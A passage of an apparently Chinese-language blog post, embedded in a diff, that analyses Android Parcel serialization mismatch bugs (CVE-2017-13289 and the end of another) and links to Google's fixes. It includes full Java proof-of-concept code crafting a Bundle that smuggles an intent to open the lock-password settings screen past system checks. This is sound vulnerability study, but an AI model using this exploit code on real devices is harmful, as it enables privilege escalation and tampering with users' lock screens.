Flags</span></span><br><span class="line">    craftData.writeString(<span class="keyword">null</span>); <span class="comment">// Package</span></span><br><span class="line">    craftData.writeString(<span class="string">&quot;com.android.settings&quot;</span>);</span><br><span class="line">    craftData.writeString(<span class="string">&quot;com.android.settings.ChooseLockPassword&quot;</span>);</span><br><span class="line">    craftData.writeInt(<span class="number">0</span>); <span class="comment">//SourceBounds</span></span><br><span class="line">    craftData.writeInt(<span class="number">0</span>); <span class="comment">//Categories</span></span><br><span class="line">    craftData.writeInt(<span class="number">0</span>); <span class="comment">//Selector</span></span><br><span class="line">    craftData.writeInt(<span class="number">0</span>); <span class="comment">//ClipData</span></span><br><span class="line">    craftData.writeInt(-<span class="number">2</span>); <span class="comment">//ContentUserHint</span></span><br><span class="line">    craftData.writeBundle(<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> ByteArrayEndPos = craftData.dataPosition(); <span class="comment">// byteArray到此结束，记录结束位置</span></span><br><span class="line">    <span class="keyword">int</span> ByteArrayLength = ByteArrayEndPos - ByteArrayStartPos; <span class="comment">// 计算ByteArray数据的长度</span></span><br><span class="line">    craftData.setDataPosition(ByteArrayStartPos - <span class="number">4</span>);  <span class="comment">// 把读写指针位移动到ByteArray部分起始位-4,即-1所在的位置</span></span><br><span class="line">    craftData.writeInt(ByteArrayLength);<span class="comment">// 在ByteArray部分前写入ByteArray这段数据的长度</span></span><br><span class="line">    craftData.setDataPosition(ByteArrayEndPos);<span class="comment">// 将读写指针移动到最后</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 这里做个用于填充的键值对</span></span><br><span class="line">    craftData.writeString(<span class="string">&quot;Padding&quot;</span>);</span><br><span class="line">    craftData.writeInt(<span class="number">0</span>); <span class="comment">// VAL_STRING</span></span><br><span class="line">    craftData.writeString(<span class="string">&quot;Padding&quot;</span>); <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> length  = craftData.dataSize();</span><br><span class="line">    bundleData.writeInt(length); <span class="comment">//所有数据的长度</span></span><br><span class="line">    bundleData.writeInt(<span class="number">0x4c444E42</span>); <span class="comment">//Bundle魔数</span></span><br><span class="line">    bundleData.appendFrom(craftData, <span class="number">0</span>, length); <span class="comment">//</span></span><br><span class="line">    bundleData.setDataPosition(<span class="number">0</span>);<span class="comment">//移动Parcel的读写指针位置到开头</span></span><br><span class="line">    retBundle.readFromParcel(bundleData);</span><br><span class="line">    <span class="keyword">return</span> retBundle;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>修复措施：<a target="_blank" rel="noopener" href="https://android.googlesource.com/platform/frameworks/base/+/b796cd32a45bcc0763c50cc1a0cc8236153dcea3^!/#F0">Diff - b796cd32a45bcc0763c50cc1a0cc8236153dcea3^! - platform/frameworks/base - Git at Google (googlesource.com)</a></p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20210912202325193.png" alt="image-20210912202325193"></p>
+<h1 id="CVE-2017-13289"><a href="#CVE-2017-13289" class="headerlink" title="CVE-2017-13289"></a>CVE-2017-13289</h1><p>对应的类是<a target="_blank" rel="noopener" href="https://android.googlesource.com/platform/frameworks/base/+/refs/tags/android-8.0.0_r1/wifi/java/android/net/wifi/RttManager.java">wifi/java/android/net/wifi/RttManager.java - platform/frameworks/base - Git at Google (googlesource.com)</a>,有5个内部类实现了<code>Parcelable</code>，一一观察，可以发现问题出在<code>ParcelableRttResults</code>这里。</p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20210913162036354.png" alt="image-20210913162036354"></p>
+<p>这个内部类的序列化工作涉及到了很多的字段，缺陷代码如图标注所示，本应用<code>writeByteArray()</code>却写成了<code>writeByte()</code>，多数情况下会少写出若干<code>Byte</code>，从而造成内存向前错位。<br>关于<code>writeByte()</code>、<code>readByte()</code>、<code>readByteArray()</code>的函数实现如下所示：<br>读入<code>ByteArray</code>时，会先读一个<code>int</code>表示Array的长度，后续的一定长度的内存空间才是Array的具体内容。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Parcelable.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">Parcelable</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">writeByte</span><span class="params">(<span class="keyword">byte</span> val)</span> </span>&#123;</span><br><span class="line">        writeInt(val);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">byte</span> <span class="title">readByte</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">byte</span>)(readInt() &amp; <span class="number">0xff</span>);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">readByteArray</span><span class="params">(<span class="keyword">byte</span>[] val)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">boolean</span> valid = nativeReadByteArray(mNativePtr, val, (val != <span class="keyword">null</span>) ? val.length : <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (!valid) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">&quot;bad array lengths&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//android_os_Parcel.cpp</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> JNINativeMethod gParcelMethods[] = &#123;</span><br><span class="line">    ......</span><br><span class="line">	&#123;<span class="string">&quot;nativeWriteByteArray&quot;</span>,      <span class="string">&quot;(J[BII)V&quot;</span>, (<span class="keyword">void</span>*)android_os_Parcel_writeByteArray&#125;,</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> <span class="built_in">android_os_Parcel_writeByteArray</span>(JNIEnv* env, jclass clazz, jlong nativePtr, </span><br><span class="line">                                             jobject data, jint offset, jint length)</span><br><span class="line">&#123;</span><br><span class="line">    Parcel* parcel = <span class="keyword">reinterpret_cast</span>&lt;Parcel*&gt;(nativePtr);</span><br><span class="line">    <span class="keyword">if</span> (parcel == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">status_t</span> err = parcel-&gt;<span class="built_in">writeInt32</span>(length);</span><br><span class="line">    <span class="keyword">if</span> (err != NO_ERROR) &#123;</span><br><span class="line">        <span class="built_in">signalExceptionForError</span>(env, clazz, err);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">void</span>* dest = parcel-&gt;<span class="built_in">writeInplace</span>(length);</span><br><span class="line">    <span class="keyword">if</span> (dest == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">signalExceptionForError</span>(env, clazz, NO_MEMORY);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    jbyte* ar = (jbyte*)env-&gt;<span class="built_in">GetPrimitiveArrayCritical</span>((jarray)data, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (ar) &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(dest, ar + offset, length);</span><br><span class="line">        env-&gt;<span class="built_in">ReleasePrimitiveArrayCritical</span>((jarray)data, ar, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>构造方法如下：</p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20210913164445607.png" alt="image-20210913164445607"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Bundle <span class="title">poc2017_13289</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Bundle retBundle = <span class="keyword">new</span> Bundle();</span><br><span class="line">    Parcel bundleData = Parcel.obtain();</span><br><span class="line">    Parcel craftData = Parcel.obtain();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//craftData是传递的Bundle载荷，这里手动构造载荷内容，然后补上Bundle格式头</span></span><br><span class="line">    craftData.writeInt(<span class="number">3</span>); <span class="comment">// 总共传递3个对象,三个key-value对</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 第一个Key为VerifyCredentialResponse，它将用来引起内存错位从而绕过检查</span></span><br><span class="line">    craftData.writeString(<span class="string">&quot;PRRPRR&quot;</span>);<span class="comment">//是这个object的名字,似乎长度有些要求</span></span><br><span class="line">    craftData.writeInt(<span class="number">4</span>); <span class="comment">// VAL_PARCELABLE = 4</span></span><br><span class="line">    craftData.writeString(<span class="string">&quot;android.net.wifi.RttManager$ParcelableRttResults&quot;</span>); <span class="comment">// value类型为ParcelableRttResults</span></span><br><span class="line">    craftData.writeInt(<span class="number">1</span>);<span class="comment">//result num</span></span><br><span class="line">    craftData.writeString(<span class="string">&quot;bssid&quot;</span>);<span class="comment">//bssid</span></span><br><span class="line">    craftData.writeInt(<span class="number">1</span>);<span class="comment">//burstNumber</span></span><br><span class="line">    craftData.writeInt(<span class="number">1</span>);<span class="comment">//measurementFrameNumber</span></span><br><span class="line">    craftData.writeInt(<span class="number">1</span>);<span class="comment">//successMeasurementFrameNumber</span></span><br><span class="line">    craftData.writeInt(<span class="number">1</span>);<span class="comment">//frameNumberPerBurstPeer</span></span><br><span class="line">    craftData.writeInt(<span class="number">1</span>);<span class="comment">//status</span></span><br><span class="line">    craftData.writeInt(<span class="number">1</span>);<span class="comment">//measurementType</span></span><br><span class="line">    craftData.writeInt(<span class="number">1</span>);<span class="comment">//retryAfterDuration</span></span><br><span class="line"></span><br><span class="line">    craftData.writeLong(<span class="number">1</span>);<span class="comment">//ts</span></span><br><span class="line"></span><br><span class="line">    craftData.writeInt(<span class="number">1</span>);<span class="comment">//rssi</span></span><br><span class="line">    craftData.writeInt(<span class="number">1</span>);<span class="comment">//rssiSpread</span></span><br><span class="line">    craftData.writeInt(<span class="number">1</span>);<span class="comment">//txRate</span></span><br><span class="line"></span><br><span class="line">    craftData.writeLong(<span class="number">1</span>);<span class="comment">//rtt</span></span><br><span class="line">    craftData.writeLong(<span class="number">1</span>);<span class="comment">//rttStandardDeviation</span></span><br><span class="line">    craftData.writeLong(<span class="number">1</span>);<span class="comment">//rttSpread</span></span><br><span class="line"></span><br><span class="line">    craftData.writeInt(<span class="number">1</span>);<span class="comment">//distance</span></span><br><span class="line">    craftData.writeInt(<span class="number">1</span>);<span class="comment">//distanceStandardDeviation</span></span><br><span class="line">    craftData.writeInt(<span class="number">1</span>);<span class="comment">//distanceSpread</span></span><br><span class="line">    craftData.writeInt(<span class="number">1</span>);<span class="comment">//burstDuration</span></span><br><span class="line">    craftData.writeInt(<span class="number">1</span>);<span class="comment">//negotiatedBurstNum</span></span><br><span class="line"></span><br><span class="line">    craftData.writeByte((<span class="keyword">byte</span>) <span class="number">255</span>);<span class="comment">//LCI.id=0xFF,不读入length和LCI.data</span></span><br><span class="line"></span><br><span class="line">    craftData.writeByte((<span class="keyword">byte</span>) <span class="number">4</span>);<span class="comment">//LCR.id=4，开始读入length=4 LCR.data= [4 1234]</span></span><br><span class="line">    craftData.writeByte((<span class="keyword">byte</span>) <span class="number">4</span>);<span class="comment">// length</span></span><br><span class="line">    craftData.writeByteArray( <span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;); <span class="comment">//data</span></span><br><span class="line"></span><br><span class="line">    craftData.writeByte((<span class="keyword">byte</span>) <span class="number">1</span>);<span class="comment">//secure</span></span><br><span class="line"></span><br><span class="line">    craftData.writeInt(<span class="number">1</span>);<span class="comment">//第二个Key的长度，后来被解析为secure</span></span><br><span class="line">    craftData.writeInt(<span class="number">4</span>);<span class="comment">//第二个Key的值，后来被接卸为key-Len</span></span><br><span class="line">    craftData.writeInt(<span class="number">13</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 接下来构造ByteArray，或者说内含Intent的ByteArray</span></span><br><span class="line">    craftData.writeInt(-<span class="number">1</span>); <span class="comment">// 这个位置用于存放ByteArray部分的长度，先占位，构造完之后再来写入</span></span><br><span class="line">    <span class="keyword">int</span> ByteArrayStartPos = craftData.dataPosition();  <span class="comment">// 记录ByteArray部分在craftData中起始位置，因为接下来要构造ByteArray了</span></span><br><span class="line"></span><br><span class="line">    craftData.writeInt(<span class="number">0</span>);</span><br><span class="line">    craftData.writeInt(<span class="number">6</span>);</span><br><span class="line">    craftData.writeLong(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    craftData.writeString(AccountManager.KEY_INTENT);</span><br><span class="line">    craftData.writeInt(<span class="number">4</span>); <span class="comment">//intent也是一个parcel</span></span><br><span class="line">    craftData.writeString(<span class="string">&quot;android.content.Intent&quot;</span>);<span class="comment">// value类型为intent，将被按照intent格式解析</span></span><br><span class="line">    craftData.writeString(Intent.ACTION_RUN); <span class="comment">// Intent Action 这里开始是intent的属性</span></span><br><span class="line">    Uri.writeToParcel(craftData, <span class="keyword">null</span>); <span class="comment">// Uri</span></span><br><span class="line">    craftData.writeString(<span class="keyword">null</span>); <span class="comment">// Type</span></span><br><span class="line">    craftData.writeInt(<span class="number">0x10000000</span>); <span class="comment">// Flags</span></span><br><span class="line">    craftData.writeString(<span class="keyword">null</span>); <span class="comment">// Package</span></span><br><span class="line">    craftData.writeString(<span class="string">&quot;com.android.settings&quot;</span>);</span><br><span class="line">    craftData.writeString(<span class="string">&quot;com.android.settings.ChooseLockPassword&quot;</span>);</span><br><span class="line">    craftData.writeInt(<span class="number">0</span>); <span class="comment">//SourceBounds</span></span><br><span class="line">    craftData.writeInt(<span class="number">0</span>); <span class="comment">//Categories</span></span><br><span class="line">    craftData.writeInt(<span class="number">0</span>); <span class="comment">//Selector</span></span><br><span class="line">    craftData.writeInt(<span class="number">0</span>); <span class="comment">//ClipData</span></span><br><span class="line">    craftData.writeInt(-<span class="number">2</span>); <span class="comment">//ContentUserHint</span></span><br><span class="line">    craftData.writeBundle(<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> ByteArrayEndPos = craftData.dataPosition(); <span class="comment">// byteArray到此结束，记录结束位置</span></span><br><span class="line">    <span class="keyword">int</span> ByteArrayLength = ByteArrayEndPos - ByteArrayStartPos; <span class="comment">// 计算ByteArray数据的长度</span></span><br><span class="line">    craftData.setDataPosition(ByteArrayStartPos - <span class="number">4</span>);  <span class="comment">// 把读写指针位移动到ByteArray部分起始位-4,即-1所在的位置</span></span><br><span class="line">    craftData.writeInt(ByteArrayLength);<span class="comment">// 在ByteArray部分前写入ByteArray这段数据的长度</span></span><br><span class="line">    craftData.setDataPosition(ByteArrayEndPos);<span class="comment">// 将读写指针移动到最后</span></span><br><span class="line">    Log.i(TAG, <span class="string">&quot;INTENT length = &quot;</span> + ByteArrayLength);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 这里做个用于填充的键值对</span></span><br><span class="line">    craftData.writeString(<span class="string">&quot;Padding&quot;</span>);</span><br><span class="line">    craftData.writeInt(<span class="number">0</span>); <span class="comment">// VAL_STRING</span></span><br><span class="line">    craftData.writeString(<span class="string">&quot;Padding&quot;</span>); <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> length  = craftData.dataSize();</span><br><span class="line">    bundleData.writeInt(length); <span class="comment">//所有数据的长度</span></span><br><span class="line">    bundleData.writeInt(<span class="number">0x4c444E42</span>); <span class="comment">//Bundle魔数</span></span><br><span class="line">    bundleData.appendFrom(craftData, <span class="number">0</span>, length); <span class="comment">//</span></span><br><span class="line">    bundleData.setDataPosition(<span class="number">0</span>);<span class="comment">//移动Parcel的读写指针位置到开头</span></span><br><span class="line">    retBundle.readFromParcel(bundleData);</span><br><span class="line">    <span class="keyword">return</span> retBundle;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>修复措施：<a target="_blank" rel="noopener" href="https://android.googlesource.com/platform/frameworks/base/+/5a3d2708cd2289a4882927c0e2cb0d3c21a99c02^!/#F0">Diff - 5a3d2708cd2289a4882927c0e2cb0d3c21a99c02^! - platform/frameworks/base - Git at Google (googlesource.com)</a></p>
+<p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20210913164553310.png" alt="image-20210913164553310"></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Android/" rel="tag"># Android</a>
+              <a href="/tags/CVE/" rel="tag"># CVE</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/07/29/Nexus5-Flashing/" rel="prev" title="Nexus5刷机体验">
+      <i class="fa fa-chevron-left"></i> Nexus5刷机体验
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/08/15/Android-NDK/" rel="next" title="Android NDK开发学习笔记">
+      Android NDK开发学习笔记 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          見出し
+        </li>
+        <li class="sidebar-nav-overview">
+          概要
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#CVE-2017-13286"><span class="nav-number">1.</span> <span class="nav-text">CVE-2017-13286</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CVE-2017-13287"><span class="nav-number">2.</span> <span class="nav-text">CVE-2017-13287</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CVE-2017-13288"><span class="nav-number">3.</span> <span class="nav-text">CVE-2017-13288</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CVE-2017-13289"><span class="nav-number">4.</span> <span class="nav-text">CVE-2017-13289</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="slient2009"
+      src="/images/round_tiger.png">
+  <p class="site-author-name" itemprop="name">slient2009</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">12</span>
+          <span class="site-state-item-name">ポスト</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">タグ</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">slient2009</span>
+</div>
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="合計閲覧者数">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="閲覧合計数">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
